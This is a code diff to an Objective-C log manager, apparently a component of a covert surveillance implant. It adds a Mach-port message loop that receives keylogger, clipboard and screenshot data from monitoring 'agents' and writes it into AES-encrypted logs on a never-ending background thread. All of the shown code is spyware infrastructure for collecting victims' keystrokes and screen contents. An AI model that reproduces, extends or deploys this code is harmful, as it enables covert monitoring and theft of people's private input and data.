@@ -18,8 +18,9 @@
 #import "RCSIEncryption.h"
 
 #import <CommonCrypto/CommonDigest.h>
+#import <mach/message.h>
 
-//#define DEBUG
+#define DEBUG_
 
 static RCSILogManager *sharedLogManager = nil;
 
@@ -44,6 +45,8 @@ typedef struct _log {
 } logStruct;
 
 @implementation RCSILogManager
+
+@synthesize notificationPort;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -115,8 +118,8 @@ typedef struct _log {
               NSData *temp = [NSData dataWithBytes: gLogAesKey
                                             length: CC_MD5_DIGEST_LENGTH];
 #endif
-              
               mEncryption = [[RCSIEncryption alloc] initWithKey: temp];
+              mLogMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
             }
           
           sharedLogManager = self;
@@ -689,6 +692,192 @@ typedef struct _log {
   return TRUE;
 }
 
+#define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))
+
+- (BOOL)processNewLog:(NSData *)aData
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  NSMutableData *payload;
+  
+  if (aData == nil)
+    return FALSE;
+    
+  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
+    
+  if (shMemLog->agentID == LOG_KEYLOG)
+    {
+      if (IS_HEADER_MANDATORY(shMemLog->flag))
+        {
+          // write down the entire data log
+          payload = [NSMutableData dataWithBytes: shMemLog->commandData 
+                                          length: shMemLog->commandDataSize];
+        }
+      else
+        {
+          // get clip/keylog data offset in low short of flag field
+          int off = (shMemLog->flag & 0x0000FFFF);
+          payload = [NSMutableData dataWithBytes: shMemLog->commandData + off 
+                                          length: shMemLog->commandDataSize - off];
+        }
+    }
+  else
+    {
+      payload = [NSMutableData dataWithBytes: shMemLog->commandData
+                                      length: shMemLog->commandDataSize];
+    }
+  
+  // Log chunck have always type setted:
+  // Snapshot agents create, data, close
+  // other only data
+  switch (shMemLog->commandType) 
+  {
+    case CM_CREATE_LOG_HEADER:
+    {
+      [self createLog: shMemLog->agentID
+          agentHeader: payload
+            withLogID: shMemLog->logID];
+      break;
+    }
+    case CM_LOG_DATA:
+    {
+      // log streaming closed by sync: recreate and append whole log
+      // log screenshot: first chunk of new images with new logID
+      if ([self writeDataToLog: payload
+                      forAgent: shMemLog->agentID
+                     withLogID: shMemLog->logID] == FALSE)
+        {
+          if ([self createLog:shMemLog->agentID 
+                  agentHeader:nil 
+                    withLogID:shMemLog->logID])
+            {
+              // if streaming keylog is closed rewrite with header
+              if (shMemLog->agentID == LOG_KEYLOG)
+                {
+                  payload = [NSMutableData dataWithBytes: shMemLog->commandData
+                                                  length: shMemLog->commandDataSize];
+                }
+              
+              [self writeDataToLog:payload 
+                          forAgent:shMemLog->agentID
+                         withLogID:shMemLog->logID];
+            }
+        }
+      break;
+    }
+    case CM_CLOSE_LOG:
+    {
+      // Write latest block and close
+      [self writeDataToLog:payload 
+                  forAgent:shMemLog->agentID
+                 withLogID:shMemLog->logID];
+      
+      [self closeActiveLog: shMemLog->agentID
+                 withLogID: shMemLog->logID];
+      break;
+    }
+    default:
+      break;
+  }
+                 
+  [pool release];
+  
+  return TRUE;
+}
+
+- (BOOL)addMessage: (NSData*)aMessage
+{
+  // messages removed by handleMachMessage
+  @synchronized(mLogMessageQueue)
+  {
+    [mLogMessageQueue addObject: aMessage];
+  }
+  
+  return TRUE;
+}
+
+typedef struct _coreMessage_t
+{
+  mach_msg_header_t header;
+  uint dataLen;
+} coreMessage_t;
+
+// handle the incomings logs
+- (void) handleMachMessage:(void *) msg 
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+
+  coreMessage_t *coreMsg = (coreMessage_t*)msg;
+  
+  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
+                                   length: coreMsg->dataLen];
+
+  [self addMessage: theData];
+  
+  [pool release];
+}
+
+// Process new incoming logs
+-(int)processIncomingLogs
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableArray *tmpMessages;
+  
+  @synchronized(mLogMessageQueue)
+  {
+    tmpMessages = [[mLogMessageQueue copy] autorelease];
+    [mLogMessageQueue removeAllObjects];
+  }
+  
+#ifdef DEBUG
+  NSLog(@"%s: process messages %d", __FUNCTION__, [tmpMessages count]);
+#endif  
+
+  int logCount = [tmpMessages count];
+  
+  for (int i=0; i < logCount; i++)
+    {
+      [self processNewLog: [tmpMessages objectAtIndex:i]];
+    }
+    
+  [pool release];
+  
+  return logCount;
+}
+
+NSString *kRunLoopLogManagerMode = @"kRunLoopLogManagerMode";
+
+- (void)logManagerRunLoop
+{
+  NSRunLoop *logManagerRunLoop = [NSRunLoop currentRunLoop];
+  
+  notificationPort = [[NSMachPort alloc] init];
+  [notificationPort setDelegate: self];
+  
+  [logManagerRunLoop addPort: notificationPort 
+                     forMode: kRunLoopLogManagerMode];
+  
+  // run the log loop: RCSICore send notification to this
+  // this thread won't be never stopped...
+  while (TRUE)
+  {
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    [logManagerRunLoop runMode: kRunLoopLogManagerMode 
+                    beforeDate: [NSDate dateWithTimeIntervalSinceNow:1.5]];
+    
+    // process incoming logs out of the runloop
+    [self processIncomingLogs];   
+    
+    [pool release];
+  }
+}
+
+- (void)start
+{
+  [NSThread detachNewThreadSelector: @selector(logManagerRunLoop) 
+                           toTarget: self withObject:nil];
+}
 
 #pragma mark -
 #pragma mark Accessors
